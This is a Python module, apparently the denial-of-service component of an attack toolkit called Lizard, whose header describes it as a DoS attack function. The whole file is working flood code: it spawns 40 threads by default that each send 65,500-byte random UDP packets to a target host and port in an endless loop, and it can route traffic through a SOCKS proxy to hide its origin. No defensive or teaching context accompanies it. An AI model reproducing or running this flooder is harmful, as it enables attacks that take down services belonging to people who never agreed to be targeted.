'''
 *@author:wr
 *@GitHub:https://github.com/wr0x00/Lizard
 *@date:2022.8.2
 *@description: dos攻击功能
'''
import socket
import threading
import random
from .sniff import isIP

'''设置语言'''
if not __name__ == '__main__':
    try:
        x=open("first_sgin.txt",'r+')
        language=x.readline()
        if language=='cn'or language=='CN': #中文
            from .strings import String_CN as Str
        if language=='en'or language=='EN': #英文
            from .strings import String_EN as Str
        x.close()
    except Exception:
        print("ERROR")
        from .strings import String_EN as Str

Max=200000
byte_size=65500
byte=random._urandom(byte_size)
c=0
def set_agent(p,socks):#设置代理
    global proxy
    proxy=p
    socket.socket = socks.socksocket
class exp:
    def sent(self):
        global c,byte
        for s in range(1,Max+1):
            sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            while True:
                sock.sendto(byte,(self.host,self.port))
                c=c+1
                print(f'\033[94m{c}\033[1;37;40m {Str.TIMES_send} {self.host}:{self.port}  {byte_size}{Str.BYTE} ')
        return None
    def __init__(self,host:str,port:str,thread=40):
        if not isIP(host):
            print(Str.ERROR_CONNECT)
            exit()
        self.host=host
        self.port=port
       
        junjun=[]
        for i in range(1,thread+1):
            send=threading.Thread(target=self.sent,args=())
            junjun.append(send)
        for i in junjun:
            i.start()
        return None